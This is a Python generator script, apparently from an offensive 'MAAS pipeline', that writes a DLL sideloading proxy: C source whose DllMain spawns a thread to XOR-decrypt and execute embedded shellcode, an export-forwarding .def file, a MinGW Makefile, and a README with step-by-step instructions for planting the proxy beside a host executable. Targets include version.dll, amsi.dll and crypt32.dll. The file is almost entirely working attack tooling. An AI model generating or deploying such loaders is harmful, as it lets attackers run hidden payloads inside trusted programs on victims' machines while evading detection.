#!/usr/bin/env python3
"""
DLL sideload proxy generator for the MAAS pipeline.

Generates C source, module-definition, and Makefile for a DLL sideloading
proxy.  The proxy forwards every export to the real DLL (renamed with an
"_orig" suffix) while executing embedded shellcode via DllMain.

Pipeline integration
--------------------
* The pipeline's "Encrypt Shellcode" stage produces shellcode.h in the same
  format this generator expects.  Pass --shellcode-header to embed a real
  payload, or leave it out to get a placeholder (0xCC breakpoint).
* Compile with the maas-builder-c Docker image:
      docker run --rm -v $PWD:/build maas-builder-c make -C /build
* The OUTPUT_FORMAT=dll pipeline path can consume these templates directly;
  copy the generated directory into loaders/loader-sideload-<target>/.
"""

from __future__ import annotations

import argparse
import os
import shutil
import sys
import textwrap
from pathlib import Path
from typing import Dict, List


# ---------------------------------------------------------------------------
# Export database
#
# Each key is the target DLL name (lowercase).  The value is a list of
# exported function names that legitimate callers commonly import.  These
# are not exhaustive; add entries as needed for specific sideloading
# scenarios.
# ---------------------------------------------------------------------------

EXPORT_DB: Dict[str, List[str]] = {
    "version.dll": [
        "GetFileVersionInfoA",
        "GetFileVersionInfoByHandle",
        "GetFileVersionInfoExA",
        "GetFileVersionInfoExW",
        "GetFileVersionInfoSizeA",
        "GetFileVersionInfoSizeExA",
        "GetFileVersionInfoSizeExW",
        "GetFileVersionInfoSizeW",
        "GetFileVersionInfoW",
        "VerFindFileA",
        "VerFindFileW",
        "VerInstallFileA",
        "VerInstallFileW",
        "VerLanguageNameA",
        "VerLanguageNameW",
        "VerQueryValueA",
        "VerQueryValueW",
    ],
    "winmm.dll": [
        "PlaySoundA",
        "PlaySoundW",
        "mciSendCommandA",
        "mciSendCommandW",
        "mciSendStringA",
        "mciSendStringW",
        "midiOutGetNumDevs",
        "midiOutOpen",
        "midiOutClose",
        "timeGetTime",
        "timeBeginPeriod",
        "timeEndPeriod",
        "timeGetDevCaps",
        "waveOutOpen",
        "waveOutClose",
        "waveOutWrite",
    ],
    "dbghelp.dll": [
        "MiniDumpWriteDump",
        "SymInitialize",
        "SymInitializeW",
        "SymCleanup",
        "SymFromAddr",
        "SymFromName",
        "SymGetLineFromAddr64",
        "SymLoadModuleEx",
        "SymSetOptions",
        "SymGetOptions",
        "StackWalk64",
        "UnDecorateSymbolName",
        "ImageNtHeader",
    ],
    "amsi.dll": [
        "AmsiInitialize",
        "AmsiOpenSession",
        "AmsiCloseSession",
        "AmsiScanBuffer",
        "AmsiScanString",
        "AmsiUninitialize",
        "AmsiResultIsMalware",
        "DllCanUnloadNow",
        "DllGetClassObject",
        "DllRegisterServer",
        "DllUnregisterServer",
    ],
    "userenv.dll": [
        "CreateEnvironmentBlock",
        "DestroyEnvironmentBlock",
        "ExpandEnvironmentStringsForUserA",
        "ExpandEnvironmentStringsForUserW",
        "GetDefaultUserProfileDirectoryA",
        "GetDefaultUserProfileDirectoryW",
        "GetProfilesDirectoryA",
        "GetProfilesDirectoryW",
        "GetUserProfileDirectoryA",
        "GetUserProfileDirectoryW",
        "LoadUserProfileA",
        "LoadUserProfileW",
        "UnloadUserProfile",
    ],
    "crypt32.dll": [
        "CertAddCertificateContextToStore",
        "CertCloseStore",
        "CertCreateCertificateContext",
        "CertFindCertificateInStore",
        "CertFreeCertificateContext",
        "CertGetCertificateChain",
        "CertGetNameStringA",
        "CertGetNameStringW",
        "CertOpenStore",
        "CertOpenSystemStoreA",
        "CertOpenSystemStoreW",
        "CertVerifyCertificateChainPolicy",
        "CryptDecodeObjectEx",
        "CryptEncodeObjectEx",
        "CryptProtectData",
        "CryptUnprotectData",
    ],
}


def _stem(dll_name: str) -> str:
    """Return the DLL name without extension (e.g. 'version')."""
    return Path(dll_name).stem


def generate_shellcode_h(shellcode_header: str | None) -> str:
    """Return the contents of shellcode.h."""
    if shellcode_header and os.path.isfile(shellcode_header):
        with open(shellcode_header, "r") as fh:
            return fh.read()
    return textwrap.dedent("""\
        /*
         * Placeholder shellcode -- replaced by the pipeline's Encrypt Shellcode stage.
         * A single 0xCC (INT3) so the loader is safe to test without real payload.
         */
        unsigned char key[32] = {
        \t0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
        \t0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
        \t0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
        \t0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41
        };

        unsigned char shellcode[1] = {
        \t0xcc
        };
    """)


def generate_proxy_c(dll_name: str) -> str:
    """Generate the proxy DLL C source."""
    stem = _stem(dll_name)
    return textwrap.dedent(f"""\
        /*
         * DLL sideload proxy for {dll_name}
         *
         * All legitimate exports are forwarded to {stem}_orig.dll via the
         * module-definition file (proxy.def).  DllMain executes the embedded
         * shellcode on attach.
         *
         * Build:
         *   x86_64-w64-mingw32-gcc -shared -o {dll_name} proxy.c proxy.def -s
         *
         * Deployment:
         *   1. Rename the real {dll_name} to {stem}_orig.dll
         *   2. Place the compiled proxy as {dll_name} next to the host EXE
         *   3. Place {stem}_orig.dll in the same directory
         *
         * Generated by sideload_gen.py -- MAAS pipeline
         */

        #include <windows.h>
        #include <string.h>
        #include "shellcode.h"

        /* ------------------------------------------------------------------ */
        /* XOR decryption -- mirrors loaders/loader-c-mingw/src/payload.c     */
        /* ------------------------------------------------------------------ */

        static void xor_decrypt(unsigned char *buf, size_t len) {{
            for (size_t i = 0; i < len; i++)
                buf[i] ^= key[i % sizeof(key)];
        }}

        /* ------------------------------------------------------------------ */
        /* Shellcode execution                                                */
        /* ------------------------------------------------------------------ */

        static DWORD WINAPI execute_payload(LPVOID param) {{
            (void)param;

            size_t sc_len = sizeof(shellcode);
            void *mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!mem) return 1;

            memcpy(mem, shellcode, sc_len);
            xor_decrypt((unsigned char *)mem, sc_len);

            DWORD old;
            if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old)) {{
                VirtualFree(mem, 0, MEM_RELEASE);
                return 1;
            }}

            ((void (*)())mem)();

            /* Unreachable for most shellcode, but clean up in case it returns */
            VirtualFree(mem, 0, MEM_RELEASE);
            return 0;
        }}

        /* ------------------------------------------------------------------ */
        /* DLL entry point                                                    */
        /* ------------------------------------------------------------------ */

        BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
            (void)lpReserved;

            if (reason == DLL_PROCESS_ATTACH) {{
                DisableThreadLibraryCalls(hModule);
                /* Spawn in a new thread to avoid loader-lock deadlocks */
                CreateThread(NULL, 0, execute_payload, NULL, 0, NULL);
            }}
            return TRUE;
        }}
    """)


def generate_def(dll_name: str, exports: List[str]) -> str:
    """Generate the module-definition file with forwarded exports."""
    stem = _stem(dll_name)
    orig = f"{stem}_orig"
    lines = [
        f"LIBRARY {stem}",
        "EXPORTS",
    ]
    for fn_name in exports:
        lines.append(f"    {fn_name} = {orig}.{fn_name}")
    lines.append("")
    return "\n".join(lines)


def generate_makefile(dll_name: str) -> str:
    """Generate a cross-compilation Makefile."""
    stem = _stem(dll_name)
    return textwrap.dedent(f"""\
        # Cross-compile sideload proxy for {dll_name}
        # Usage:  make            (builds {dll_name})
        #         make clean      (removes build artifacts)
        #
        # Requires: x86_64-w64-mingw32-gcc (MinGW-w64 toolchain)

        CC      = x86_64-w64-mingw32-gcc
        CFLAGS  = -O2 -Wall -Wextra
        LDFLAGS = -shared -s
        TARGET  = {dll_name}
        SRC     = proxy.c
        DEF     = proxy.def

        .PHONY: all clean

        all: $(TARGET)

        $(TARGET): $(SRC) $(DEF) shellcode.h
        \t$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(SRC) $(DEF)

        clean:
        \trm -f $(TARGET)

        # Deployment reminder:
        #   1. Rename the real {dll_name} -> {stem}_orig.dll
        #   2. Copy $(TARGET) as {dll_name} beside the host executable
        #   3. Ensure {stem}_orig.dll is in the same directory
    """)


def generate_readme(dll_name: str, exports: List[str]) -> str:
    """Generate a short README for the output directory."""
    stem = _stem(dll_name)
    export_list = "\n".join(f"  - {e}" for e in exports)
    return textwrap.dedent(f"""\
        DLL Sideload Proxy: {dll_name}
        {"=" * (len("DLL Sideload Proxy: ") + len(dll_name))}

        Forwarded exports ({len(exports)}):
        {export_list}

        Build
        -----
        Cross-compile with MinGW-w64:

            make

        Or directly:

            x86_64-w64-mingw32-gcc -shared -o {dll_name} proxy.c proxy.def -s

        Deploy
        ------
        1. Rename the legitimate {dll_name} to {stem}_orig.dll
        2. Place the compiled proxy DLL as {dll_name} next to the target EXE
        3. Place {stem}_orig.dll in the same directory
        4. When the target EXE loads {dll_name}, DllMain fires the shellcode
           while all API calls are transparently forwarded to {stem}_orig.dll

        Pipeline
        --------
        The Encrypt Shellcode stage replaces shellcode.h with XOR-encrypted
        payload data.  The Build - C stage compiles with:

            x86_64-w64-mingw32-gcc -shared -o {dll_name} proxy.c proxy.def -s
    """)


def list_targets() -> None:
    """Print all supported DLL targets and their export counts."""
    print("Supported sideload targets:\n")
    for dll, exports in sorted(EXPORT_DB.items()):
        print(f"  {dll:<20s}  {len(exports):>3d} exports")
    print(f"\n  Total: {len(EXPORT_DB)} targets")


def generate(dll_name: str, output_dir: str, shellcode_header: str | None) -> None:
    """Generate all sideload proxy files into output_dir."""
    dll_key = dll_name.lower()
    if dll_key not in EXPORT_DB:
        print(f"Error: unknown target '{dll_name}'", file=sys.stderr)
        print(f"Supported targets: {', '.join(sorted(EXPORT_DB.keys()))}", file=sys.stderr)
        sys.exit(1)

    exports = EXPORT_DB[dll_key]
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)

    files = {
        "proxy.c": generate_proxy_c(dll_key),
        "proxy.def": generate_def(dll_key, exports),
        "shellcode.h": generate_shellcode_h(shellcode_header),
        "Makefile": generate_makefile(dll_key),
        "README.txt": generate_readme(dll_key, exports),
    }

    for name, content in files.items():
        path = out / name
        path.write_text(content, encoding="utf-8")
        print(f"  [+] {path}")

    print(f"\nGenerated {len(files)} files for {dll_key} sideloading in {out}")
    print(f"Forwarding {len(exports)} exports to {_stem(dll_key)}_orig.dll")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate DLL sideload proxy source for the MAAS pipeline.",
        epilog="Example: %(prog)s --target version.dll --output ./output/",
    )
    parser.add_argument(
        "--target",
        required=False,
        help="Target DLL to proxy (e.g. version.dll, winmm.dll)",
    )
    parser.add_argument(
        "--output",
        default="./output",
        help="Output directory for generated files (default: ./output)",
    )
    parser.add_argument(
        "--shellcode-header",
        default=None,
        help="Path to a shellcode.h file to embed (default: placeholder)",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="List all supported sideload targets and exit",
    )
    args = parser.parse_args()

    if args.list:
        list_targets()
        sys.exit(0)

    if not args.target:
        parser.error("--target is required (use --list to see available targets)")

    generate(args.target, args.output, args.shellcode_header)


if __name__ == "__main__":
    main()
